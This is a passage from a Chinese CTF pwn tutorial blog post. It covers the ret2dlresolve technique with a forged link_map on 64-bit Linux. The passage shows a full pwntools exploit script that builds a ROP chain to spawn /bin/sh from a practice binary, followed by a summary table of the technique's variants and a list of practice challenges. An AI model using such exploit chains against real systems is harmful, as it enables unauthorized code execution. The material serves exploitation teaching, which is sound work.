dq offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000601030 _got_plt        ends</span><br><span class="line">.got.plt:0000000000601030</span><br></pre></td></tr></table></figure>

<p>与此同时，通过阅读 <code>_dl_fixup</code> 函数的代码，在设置 <code>__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0)</code> 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。</p>
<p>利用代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level="debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">io = process(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'\x00'</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2dlresolve_with_fakelinkmap_x64</span><span class="params">(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    elf: is the ELF object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fake_linkmap_addr: the address of the fake linkmap</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span></span><br><span class="line"><span class="string">                        target_function_addr is the function you want to execute</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    WARNING: be careful that fake_linkmap is 0x100 bytes length   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    linkmap:</span></span><br><span class="line"><span class="string">        0x00: l_addr = offset_of_two_addr</span></span><br><span class="line"><span class="string">      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span></span><br><span class="line"><span class="string">        0x08: 17, tag of the JMPREL</span></span><br><span class="line"><span class="string">        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span></span><br><span class="line"><span class="string">      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span></span><br><span class="line"><span class="string">        0x18: p_r_offset, offset pointer to the resloved addr</span></span><br><span class="line"><span class="string">        0x20: r_info</span></span><br><span class="line"><span class="string">        0x28: append</span></span><br><span class="line"><span class="string">      resolved addr</span></span><br><span class="line"><span class="string">        0x30: r_offset</span></span><br><span class="line"><span class="string">      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38</span></span><br><span class="line"><span class="string">        0x38: 6, tag of the DT_SYMTAB</span></span><br><span class="line"><span class="string">        0x40: known_function_ptr-8, p_fake_symbol_table</span></span><br><span class="line"><span class="string">      command that you want to execute for system</span></span><br><span class="line"><span class="string">        0x48: /bin/sh</span></span><br><span class="line"><span class="string">      P_DT_STRTAB, pointer for DT_STRTAB</span></span><br><span class="line"><span class="string">        0x68: fake a pointer, e.g., fake_linkmap_addr</span></span><br><span class="line"><span class="string">      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span></span><br><span class="line"><span class="string">        0x70: fake_linkmap_addr + 0x38</span></span><br><span class="line"><span class="string">      p_DT_JMPREL, pointer for fake_DT_JMPREL</span></span><br><span class="line"><span class="string">        0xf8: fake_linkmap_addr + 0x8</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    linkmap = p64(offset_of_two_addr &amp; (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">17</span>) + p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset</span></span><br><span class="line">    <span class="comment"># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span></span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset_of_two_addr)</span><br><span class="line">                   &amp; (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">6</span>) + p64(known_function_ptr<span class="number">-8</span>)</span><br><span class="line">    linkmap += <span class="string">'/bin/sh\x00'</span>           <span class="comment"># cmd offset 0x48</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>)</span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">'A'</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0+<span class="number">6</span>) + p64(fake_linkmap_addr) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> (linkmap, resolve_call)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">fake_linkmap_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">'\x00'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got[<span class="string">'read'</span>],libc.sym[<span class="string">'system'</span>]- libc.sym[<span class="string">'read'</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, elf.got[<span class="string">'read'</span>], <span class="number">0</span>, fake_linkmap_addr, len(link_map)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(len(rop.chain()) &lt;= <span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"><span class="comment"># send linkmap</span></span><br><span class="line">io.send(link_map)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#0x00000000004007a1: pop rsi; pop r15; ret; </span></span><br><span class="line">rop.raw(<span class="number">0x00000000004007a1</span>)  <span class="comment"># stack align 16 bytes</span></span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>)  <span class="comment"># 0x00000000004007a3: pop rdi; ret;</span></span><br><span class="line">rop.raw(fake_linkmap_addr + <span class="number">0x48</span>)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><table>
<thead>
<tr>
<th align="left"></th>
<th align="left">修改 dynamic 节的内容</th>
<th align="center">修改重定位表项的位置</th>
<th align="left">伪造 linkmap</th>
</tr>
</thead>
<tbody><tr>
<td align="left">主要前提要求</td>
<td align="left">无</td>
<td align="center">无</td>
<td align="left">无信息泄漏时需要 libc</td>
</tr>
<tr>
<td align="left">适用情况</td>
<td align="left">NO RELRO</td>
<td align="center">NO RELRO, Partial RELRO</td>
<td align="left">NO RELRO, Partial RELRO</td>
</tr>
<tr>
<td align="left">注意点</td>
<td align="left"></td>
<td align="center">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>
<td align="left">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>
</tr>
</tbody></table>
<p>总的来说，与 ret2dlresolve 攻击最为相关的一些动态节为</p>
<ul>
<li>DT_JMPREL</li>
<li>DT_SYMTAB</li>
<li>DT_STRTAB</li>
<li>DT_VERSYM</li>
</ul>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><ul>
<li>pwnable.kr unexploitable</li>
<li>pwnable.tw unexploitable</li>
<li>0CTF 2018 babystack</li>
<li>0CTF 2018 blackhole</li>
</ul>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Stack/">https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Stack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/read.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门到入狱-Format</div></div></a></div><div class="next-post pull-right"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门到入狱</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2022-05/pwn题如何配置和靶机一样的环境/" title="pwn题如何配置和靶机一样的环境"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">pwn题如何配置和靶机一样的环境</div></div></a></div><div class="relatedPosts_item"><a href="/2022-05/从0开始的pwn题环境配置/" title="从0开始的pwn题环境配置"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">从0开始的pwn题环境配置</div></div></a></div><div class="relatedPosts_item"><a href="/2022-04/PWN入门到入狱-Code/" title="PWN入门到入狱-Code"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-15</div><div class="relatedPosts_title">PWN入门到入狱-Code</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Integer/" title="PWN入门到入狱-Integer"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Integer</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Heap/" title="PWN入门到入狱-Heap"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Heap</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Format/" title="PWN入门到入狱-Format"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Format</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>